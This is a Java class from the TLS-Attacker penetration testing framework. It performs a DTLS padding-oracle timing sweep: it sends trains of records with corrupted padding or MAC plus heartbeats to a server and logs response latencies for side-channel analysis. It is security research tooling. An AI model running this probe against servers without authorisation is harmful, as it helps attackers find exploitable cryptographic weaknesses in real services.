/**
 * TLS-Attacker - A Modular Penetration Testing Framework for TLS.
 *
 * Copyright (C) 2015 Chair for Network and Data Security,
 *                    Ruhr University Bochum
 *                    (juraj.somorovsky@rub.de)
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package de.rub.nds.tlsattacker.attacks.impl;

import de.rub.nds.tlsattacker.attacks.config.DtlsPaddingOracleAttackSweepTestCommandConfig;
import de.rub.nds.tlsattacker.tls.Attacker;
import de.rub.nds.tlsattacker.dtls.record.handlers.RecordHandler;
import de.rub.nds.tlsattacker.modifiablevariable.bytearray.ByteArrayModificationFactory;
import de.rub.nds.tlsattacker.modifiablevariable.bytearray.ModifiableByteArray;
import de.rub.nds.tlsattacker.tls.config.ConfigHandler;
import de.rub.nds.tlsattacker.tls.constants.ConnectionEnd;
import de.rub.nds.tlsattacker.tls.protocol.ProtocolMessage;
import de.rub.nds.tlsattacker.tls.protocol.alert.messages.AlertMessage;
import de.rub.nds.tlsattacker.tls.protocol.application.messages.ApplicationMessage;
import de.rub.nds.tlsattacker.tls.protocol.constants.ProtocolMessageType;
import de.rub.nds.tlsattacker.tls.protocol.heartbeat.messages.HeartbeatMessage;
import de.rub.nds.tlsattacker.dtls.record.messages.Record;
import de.rub.nds.tlsattacker.tls.protocol.alert.constants.AlertDescription;
import de.rub.nds.tlsattacker.tls.protocol.alert.constants.AlertLevel;
import de.rub.nds.tlsattacker.tls.workflow.TlsContext;
import de.rub.nds.tlsattacker.tls.workflow.WorkflowExecutor;
import de.rub.nds.tlsattacker.tls.workflow.WorkflowTrace;
import de.rub.nds.tlsattacker.transport.TransportHandler;
import de.rub.nds.tlsattacker.util.RandomHelper;
import java.io.FileWriter;
import java.io.IOException;
import java.net.SocketTimeoutException;
import java.util.ArrayList;
import java.util.List;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * Performs a latency test based on trains of invalid padding and invalid mac
 * messages through a configurable range of message sizes.
 * 
 * @author Florian Pfützenreuter <florian.pfuetzenreuter@rub.de>
 */
public class DtlsPaddingOracleAttackSweepTest extends Attacker<DtlsPaddingOracleAttackSweepTestCommandConfig> {

    public static Logger LOGGER = LogManager.getLogger(DtlsPaddingOracleAttackSweepTest.class);

    private TlsContext tlsContext;

    private RecordHandler recordHandler;

    private List<ProtocolMessage> protocolMessages;

    private TransportHandler transportHandler;

    private final ModifiableByteArray modifiedPaddingArray = new ModifiableByteArray(),
	    modifiedMacArray = new ModifiableByteArray();

    private int currentMessageSize;

    private int numberOfIterations;

    private WorkflowExecutor workflowExecutor;

    private WorkflowTrace trace;

    public DtlsPaddingOracleAttackSweepTest(DtlsPaddingOracleAttackSweepTestCommandConfig config) {
	super(config);
    }

    @Override
    public void executeAttack(ConfigHandler configHandler) {
	initExecuteAttack(configHandler);
	long[][][] resultBuffer = new long[numberOfIterations][config.getNrOfRoundsPerIteration()][2];
	FileWriter fileWriter;
	StringBuilder sb;
	int counter = 0;

	workflowExecutor.executeWorkflow();

	try {
	    sb = new StringBuilder(50);
	    for (int i = 0; i < numberOfIterations; i++) {
		resultBuffer[i] = executeAttackRound();

		sb.append("End of iteration ");
		sb.append(i + 1);
		sb.append("/");
		sb.append(numberOfIterations);
		LOGGER.info(sb.toString());
		sb.setLength(0);
	    }

	    if (config.getResultFilePath() != null) {
		sb = new StringBuilder(2097152);
		fileWriter = new FileWriter(config.getResultFilePath(), true);

		currentMessageSize = config.getStartMessageSize();
		for (long[][] iterationResults : resultBuffer) {
		    for (long[] roundResults : iterationResults) {
			sb.append(counter);
			sb.append(";invalid_Padding_l_");
			sb.append(currentMessageSize);
			sb.append(";");
			sb.append(roundResults[0]);
			sb.append("\n");
			counter++;
			sb.append(counter);
			sb.append(";invalid_MAC_l_");
			sb.append(currentMessageSize);
			sb.append(";");
			sb.append(roundResults[1]);
			sb.append("\n");
			counter++;
			// Limit string builder RAM usage to about 4 MiByte by
			// writing out data
			if (sb.length() > 2097000) {
			    fileWriter.write(sb.toString());
			    sb.setLength(0);
			}
		    }
		    currentMessageSize += config.getMessageSizeIncrement();
		}

		fileWriter.write(sb.toString());
		fileWriter.close();
	    }
	} catch (IOException e) {
	    LOGGER.info(e.getLocalizedMessage());
	}

	closeDtlsConnectionGracefully();

	transportHandler.closeConnection();
    }

    private long[][] executeAttackRound() throws IOException {
	long[][] results = new long[config.getNrOfRoundsPerIteration()][2];
	byte[] roundMessageData = new byte[currentMessageSize];
	byte[][] invalidPaddingTrain;
	byte[][] invalidMacTrain;

	for (int i = 0; i < config.getNrOfRoundsPerIteration(); i++) {
	    RandomHelper.getRandom().nextBytes(roundMessageData);
	    invalidPaddingTrain = createInvalidPaddingMessageTrain(config.getMessagesPerTrain(), roundMessageData);
	    invalidMacTrain = createInvalidMacMessageTrain(config.getMessagesPerTrain(), roundMessageData);
	    for (byte[] record : invalidPaddingTrain) {
		transportHandler.sendData(record);
	    }
	    long startNanos = System.nanoTime();
	    try {
		transportHandler.fetchData();
	    } catch (SocketTimeoutException e) {
		LOGGER.info("Receive timeout when waiting for heartbeat answer (invalid padding)");
	    }
	    long endNanos = System.nanoTime();
	    results[i][0] = endNanos - startNanos;

	    for (byte[] record : invalidMacTrain) {
		transportHandler.sendData(record);
	    }
	    startNanos = System.nanoTime();
	    try {
		transportHandler.fetchData();
	    } catch (SocketTimeoutException e) {
		LOGGER.info("Receive timeout when waiting for heartbeat answer (invalid MAC)");
	    }
	    endNanos = System.nanoTime();
	    results[i][1] = endNanos - startNanos;
	}

	currentMessageSize += config.getMessageSizeIncrement();
	return results;
    }

    private byte[][] createInvalidPaddingMessageTrain(int n, byte[] messageData) {
	byte[][] train = new byte[n + 1][];
	List<de.rub.nds.tlsattacker.tls.record.messages.Record> records = new ArrayList<>();
	ApplicationMessage apMessage = new ApplicationMessage(ConnectionEnd.CLIENT);
	protocolMessages.add(apMessage);
	Record record;
	apMessage.setData(messageData);

	for (int i = 0; i < n; i++) {
	    record = new Record();
	    record.setPadding(modifiedPaddingArray);
	    records.add(record);
	    train[i] = recordHandler.wrapData(messageData, ProtocolMessageType.APPLICATION_DATA, records);
	    records.remove(0);
	}

	records.add(new Record());
	HeartbeatMessage hbMessage = new HeartbeatMessage();
	protocolMessages.add(hbMessage);
	train[n] = recordHandler.wrapData(hbMessage.getProtocolMessageHandler(tlsContext).prepareMessage(),
		ProtocolMessageType.HEARTBEAT, records);

	return train;
    }

    private byte[][] createInvalidMacMessageTrain(int n, byte[] messageData) {
	byte[][] train = new byte[n + 1][];
	List<de.rub.nds.tlsattacker.tls.record.messages.Record> records = new ArrayList<>();
	ApplicationMessage apMessage = new ApplicationMessage(ConnectionEnd.CLIENT);
	protocolMessages.add(apMessage);
	apMessage.setData(messageData);

	Record record = new Record();
	record.setMac(modifiedMacArray);
	records.add(record);
	byte[] recordBytes = recordHandler.wrapData(messageData, ProtocolMessageType.APPLICATION_DATA, records);

	for (int i = 0; i < n; i++) {
	    train[i] = recordBytes;
	}

	records.remove(0);
	records.add(new Record());
	HeartbeatMessage hbMessage = new HeartbeatMessage();
	protocolMessages.add(hbMessage);
	train[n] = (recordHandler.wrapData(hbMessage.getProtocolMessageHandler(tlsContext).prepareMessage(),
		ProtocolMessageType.HEARTBEAT, records));

	return train;
    }

    private void closeDtlsConnectionGracefully() {
	AlertMessage closeNotify = new AlertMessage();
	closeNotify.setConfig(AlertLevel.FATAL, AlertDescription.CLOSE_NOTIFY);
	List<de.rub.nds.tlsattacker.tls.record.messages.Record> records = new ArrayList<>();
	records.add(new Record());

	try {
	    transportHandler.sendData(recordHandler.wrapData(closeNotify.getProtocolMessageHandler(tlsContext)
		    .prepareMessage(), ProtocolMessageType.ALERT, records));
	} catch (IOException e) {
	    LOGGER.error(e.getLocalizedMessage());
	}
    }

    private void initExecuteAttack(ConfigHandler configHandler) {
	transportHandler = configHandler.initializeTransportHandler(config);
	tlsContext = configHandler.initializeTlsContext(config);
	workflowExecutor = configHandler.initializeWorkflowExecutor(transportHandler, tlsContext);
	recordHandler = (RecordHandler) tlsContext.getRecordHandler();
	trace = tlsContext.getWorkflowTrace();
	protocolMessages = trace.getProtocolMessages();
	modifiedPaddingArray.setModification(ByteArrayModificationFactory.xor(new byte[] { 1 }, 0));
	modifiedMacArray.setModification(ByteArrayModificationFactory.xor(new byte[] { 0x50, (byte) 0xFF, 0x1A, 0x7C },
		0));
	currentMessageSize = config.getStartMessageSize();
	numberOfIterations = (int) Math.ceil(((double) (config.getEndMessageSize() - config.getStartMessageSize()))
		/ config.getMessageSizeIncrement());
    }
}
